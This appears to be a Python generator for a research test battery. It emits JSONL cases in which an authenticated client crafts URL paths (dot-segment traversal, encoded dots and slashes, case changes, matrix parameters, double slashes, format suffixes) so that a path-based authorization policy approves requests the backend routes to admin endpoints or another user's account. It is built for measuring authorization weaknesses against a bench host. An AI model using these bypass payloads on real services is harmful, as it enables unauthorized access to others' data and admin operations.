"""Generate the E4 attack battery: the malicious-but-legitimate client (A_client).

Threat model (task E4): alice holds her own valid token + DPoP key and can mint a proof for
ANY (htm, htu) she likes. She crafts a request whose PATH the PDP's path policy reads as one
of her own (or a non-admin) resources, but which the backend framework ROUTES to a forbidden
resource/op (an admin route, or bob's account). She mints the proof with
``htu = origin + <the exact mutated path>`` so the RFC 9449 §4.3 htu check passes.

Each vector names the W5 interpretation lead it exercises. The runner (e4_runner.py) mints the
A_client proof per case; the oracle (e4_oracle.py) flags a violation when the PDP allowed alice
and the executor acted on a forbidden resource/op.

Output: a JSONL of cases (one per line). Fields match what the runner/oracle need, including
``raw_request_b64`` (the exact wire bytes with auth placeholders) and ``htu``/``htm``.

Run from binding/harness:  python ../experiments/e4/scripts/gen_cases.py > ../experiments/e4/cases.jsonl
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "harness"))

from rawhttp.model import RawRequest
from mutator.base_ops import AUTHZ_PLACEHOLDER, PROOF_PLACEHOLDER

ORIGIN = "http://api.bench.test"
HOST = "api.bench.test"
ALICE = "acc-alice-1"
BOB = "acc-bob-1"

# A vector: (vector_id, policy_scope, cls, method, target, forbidden_op, forbidden_kind, source)
#   policy_scope: which PDP style the vector is meant to defeat (for grouping only; every
#     case is sent to whatever PDP the topology runs). "direct"/"legit" are controls.
#   cls: primitive class (g2 interpretation differential, g1, g3).
#   forbidden_kind: "admin" | "bob" | None(control).
_JSON = '{"nickname":"pwned"}'

VECTORS = [
    # ── allow-list defeat: dot-segment traversal keeps alice's prefix at the string start,
    #    so a prefix allow-rule fires; a resolving router (Kestrel/ASP.NET) routes elsewhere.
    ("dotseg-bob-get", "allowlist", "g2", "GET",
     f"/api/v1/accounts/{ALICE}/../{BOB}", "getAccount", "bob",
     "W5 aspnet: Kestrel resolves /../ before routing"),
    ("dotseg-bob-getv2", "allowlist", "g2", "GET",
     f"/api/v2/accounts/{ALICE}/../{BOB}", "getAccountV2", "bob",
     "W5 aspnet: /../ resolved; /api/v2/../v1 also crosses mounts"),
    ("dotseg-bob-del", "allowlist", "g2", "DELETE",
     f"/api/v1/accounts/{ALICE}/../{BOB}", "deleteAccount", "bob",
     "W5 aspnet: /../ resolved"),
    ("dotseg-bob-put", "allowlist", "g2", "PUT",
     f"/api/v1/accounts/{ALICE}/../{BOB}", "updateAccount", "bob",
     "W5 aspnet: /../ resolved", _JSON),
    ("dotseg-admin-list", "allowlist", "g2", "GET",
     f"/api/v1/accounts/{ALICE}/../../admin/users", "adminListUsers", "admin",
     "W5 aspnet: /../ resolved to admin"),
    ("dotseg-admin-del", "allowlist", "g2", "DELETE",
     f"/api/v1/accounts/{ALICE}/../../admin/users/u-1", "adminDeleteUser", "admin",
     "W5 aspnet: /../ resolved to admin"),
    ("dotseg-v2v1-admin", "allowlist", "g2", "GET",
     f"/api/v2/accounts/{ALICE}/../../../v1/admin/users", "adminListUsers", "admin",
     "W5 aspnet: documented `/api/v2/../v1/admin/users` -> adminListUsers"),
    ("encdotseg-bob-get", "allowlist", "g2", "GET",
     f"/api/v1/accounts/{ALICE}/%2e%2e/{BOB}", "getAccount", "bob",
     "W5 aspnet: %2e%2e decoded then resolved"),
    ("encdotseg-admin-list", "allowlist", "g2", "GET",
     f"/api/v1/accounts/{ALICE}/%2e%2e/%2e%2e/admin/users", "adminListUsers", "admin",
     "W5 aspnet: %2e%2e decoded then resolved"),

    # ── block-list defeat: evade a boundaried deny regex while the router still reaches admin.
    ("case-admin-list", "blocklist", "g2", "GET",
     "/api/v1/ADMIN/users", "adminListUsers", "admin",
     "W5 aspnet: case-insensitive routing"),
    ("case-admin-del", "blocklist", "g2", "DELETE",
     "/api/v1/ADMIN/users/u-1", "adminDeleteUser", "admin",
     "W5 aspnet: case-insensitive routing"),
    ("case-api-admin", "blocklist", "g2", "GET",
     "/API/V1/admin/users", "adminListUsers", "admin",
     "W5 aspnet: case-insensitive routing (prefix segments)"),
    ("matrix-admin-list", "blocklist", "g2", "GET",
     "/api/v1/admin;x=1/users", "adminListUsers", "admin",
     "W5 spring: matrix params stripped for matching"),
    ("matrix-admin-del", "blocklist", "g2", "DELETE",
     "/api/v1/admin;x=1/users/u-1", "adminDeleteUser", "admin",
     "W5 spring: documented `DELETE /api/v1/admin;x=1/users/u-1` -> adminDeleteUser"),
    ("matrix-accounts-bob", "blocklist", "g2", "GET",
     f"/api/v1/accounts;x=1/{BOB}", "getAccount", "bob",
     "W5 spring: matrix param on the accounts segment evades the ownership regex"),
    ("dslash-admin-list", "blocklist", "g2", "GET",
     "/api/v1//admin/users", "adminListUsers", "admin",
     "W5 rails: `//` squeezed by normalize_path"),
    ("dslash-admin-del", "blocklist", "g2", "DELETE",
     "/api/v1//admin/users/u-1", "adminDeleteUser", "admin",
     "W5 rails: `//` squeezed"),
    ("dslash-accounts-bob", "blocklist", "g2", "GET",
     f"/api/v1//accounts/{BOB}", "getAccount", "bob",
     "W5 rails: `//` squeezed; `/api/v1//accounts/x` -> getAccount"),
    ("json-admin-list", "blocklist", "g2", "GET",
     "/api/v1/admin/users.json", "adminListUsers", "admin",
     "W5 rails: `.json` stripped as :format (defeats an exact deny rule)"),
    ("json-accounts-bob", "blocklist", "g2", "GET",
     f"/api/v1/accounts/{BOB}.json", "getAccount", "bob",
     "W5 rails: `.json` stripped; id becomes acc-bob-1"),
    ("trail-admin-list", "blocklist", "g2", "GET",
     "/api/v1/admin/users/", "adminListUsers", "admin",
     "W5 express/aspnet/rails/laravel: trailing slash matches (defeats an exact deny rule)"),
    ("encslash-bob-get", "blocklist", "g2", "GET",
     f"/api/v1/accounts/{ALICE}%2f..%2f{BOB}", "getAccount", "bob",
     "W5 express/chi: %2F kept in a param / ambiguous segment"),

    # ── controls: a direct forbidden request. Both policies MUST deny (no violation).
    ("direct-admin-list", "direct", "g2", "GET",
     "/api/v1/admin/users", "adminListUsers", "admin", "control: direct admin"),
    ("direct-admin-del", "direct", "g2", "DELETE",
     "/api/v1/admin/users/u-1", "adminDeleteUser", "admin", "control: direct admin"),
    ("direct-bob-get", "direct", "g2", "GET",
     f"/api/v1/accounts/{BOB}", "getAccount", "bob", "control: direct bob"),
    ("direct-bob-getv2", "direct", "g2", "GET",
     f"/api/v2/accounts/{BOB}", "getAccountV2", "bob", "control: direct bob"),

    # ── controls: a legitimate alice request. PDP allow, executor serves alice (no violation).
    ("legit-alice-get", "legit", "g2", "GET",
     f"/api/v1/accounts/{ALICE}", "getAccount", None, "control: legit own"),
    ("legit-alice-getv2", "legit", "g2", "GET",
     f"/api/v2/accounts/{ALICE}", "getAccountV2", None, "control: legit own"),
    ("legit-me", "legit", "g2", "GET", "/api/v1/me", "me", None, "control: legit own"),
]


def build_raw(method: str, target: str, body_str: str | None) -> bytes:
    headers = [
        ("Host", HOST),
        ("Authorization", AUTHZ_PLACEHOLDER),
        ("DPoP", PROOF_PLACEHOLDER),
        ("Accept", "application/json"),
        ("User-Agent", "bind-harness-e4/1.0"),
    ]
    body = b""
    if body_str is not None:
        body = body_str.encode()
        headers.append(("Content-Type", "application/json"))
        headers.append(("Content-Length", str(len(body))))
    headers.append(("Connection", "close"))
    return RawRequest(method=method, target=target, version="HTTP/1.1",
                      headers=headers, body=body).to_bytes()


def main():
    for v in VECTORS:
        vid, scope, cls, method, target, fop, fkind, source = v[:8]
        body_str = v[8] if len(v) > 8 else None
        raw = build_raw(method, target, body_str)
        # htu = origin + the mutated path (no query). alice mints the proof to match.
        path = target.split("?", 1)[0]
        htu = ORIGIN + path
        case = {
            "case_id": vid,
            "vector_id": vid,
            "policy_scope": scope,
            "class": cls,
            "base_op_id": fop,          # the op the attacker intends to reach (reference)
            "base_method": method,
            "base_path": path,
            "forbidden_op": fop,
            "forbidden_kind": fkind,
            "primitive_ids": [f"e4-{vid}"],
            "client": "alice",
            "htm": method,
            "htu": htu,
            "source": source,
            "raw_request_b64": base64.b64encode(raw).decode("ascii"),
        }
        print(json.dumps(case))


if __name__ == "__main__":
    main()
